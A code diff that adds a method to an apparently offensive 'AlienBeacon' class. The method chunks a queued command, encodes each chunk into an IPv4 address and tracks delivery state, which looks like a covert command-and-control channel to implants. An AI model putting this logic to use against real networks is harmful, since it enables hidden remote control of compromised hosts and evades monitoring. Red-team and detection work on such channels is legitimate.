@@ -113,3 +113,35 @@ class AlienBeacon:
         self.update_counter()
 
         return BeaconResponse(ip_address, None)
+
+    def process_command_receive_request(self, data):
+        self.log("Request: RECEIVE COMMAND", loglevel=logging.DEBUG)
+
+        command_chunk_size = 4
+        command_chunk_prefix = ""
+
+        if self.command_sent == "":
+            command_chunk_size = 3
+            command_chunk_prefix = chr(TaskTypes.cmd)
+
+        lower_bound = len(self.command_sent)
+
+        upper_bound = min([len(self.command), len(self.command_sent) + command_chunk_size])
+
+        command_chunk = self.command[lower_bound:upper_bound]
+
+        self.command_sent += command_chunk
+        self.log(f"Response: execute command '{command_chunk}'", loglevel=logging.DEBUG)
+
+        command_chunk = command_chunk_prefix + command_chunk
+
+        command_chunk = command_chunk.ljust(4, "E")
+
+        ip_address = socket.inet_ntoa(command_chunk.encode())
+
+        self.update_counter()
+
+        if self.command_sent == self.command:
+            self.state = BeaconStates.pending_commandresult
+
+        return BeaconResponse(ip_address, None)
